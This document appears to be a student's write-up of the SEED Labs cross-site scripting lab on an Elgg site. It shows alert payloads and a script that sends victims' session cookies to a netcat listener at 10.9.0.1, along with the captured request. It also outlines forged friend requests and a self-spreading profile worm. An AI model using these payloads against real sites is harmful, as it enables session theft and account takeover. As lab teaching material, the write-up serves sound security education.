# 3.2 - Task 1
Visit http://www.seed-server.com.
Choose Alice as profile to inject.
In Profile > Edit Profile > About Me > Edit HTML we put `<script>alert('XSS');</script>` to inject XSS attack.

Same but this time, in the script section we set as src the file with the JS code inside.
N.B. upload the file somewhere, i was not able to get the url of the file itself after having uploaded it in Elgg

# 3.3 - Task 2
Same as first part of 3.2 but with `<script>alert(document.cookie);</script>` as js code.

#3.4 - Task 3
First with nc -lknv 5555 we open a reverse TCP connection.
Then same as 3.2, we put `<script>
document.write('<img src=http://10.9.0.1:5555?c=' + escape(document.cookie) + ' >');
</script>` in profile.

We will receive something like this
```
Connection received on 10.0.2.15 39252
GET /?c=Elgg%3Dcsoaqp98l0l299ga1587gn9d3d HTTP/1.1
Host: 10.9.0.1:5555
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: image/avif,image/webp,image/png,image/svg+xml,image/*;q=0.8,*/*;q=0.5
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Referer: http://www.seed-server.com/
Priority: u=4, i
```
# 3.5 - Task 4

With HTTP Header Live addon we figure out the URL to add someone as friend, which is `http://www.seed-server.com/action/friends/add?friend=profile-code&__elgg_ts=...&__elgg_token=...g&__elgg_ts=...&__elgg_token=...`.

Also we need to retrieve the friend code for samy which in this case is 59.
N.B. It may change depending on installation.

We edit the js code accordingly.

# 3.6 - Task 5

We need to complete the given file by looking for:
- the **content**: found by intercepting a edit request
- the **samyGuid**: found also by intercepting a edit request made on the Samy profile or by writing `elgg.session.user.guid` on the web console when logged on the samy profile
- the edit request **url**: found also by intercepting the edit request made

After have edited the file we put the content inside `<script>` tags in the About Me section of Samy and try to view it while being logged as another user.

# 3.7 - Task 6

For this task we merge Task 4 and Task 5 with the script provided to copy the work itself over and over.

N.B. Remember to encode ONLY the wormcode (headtag + jscode + tailtag).

# 4 - Task 7
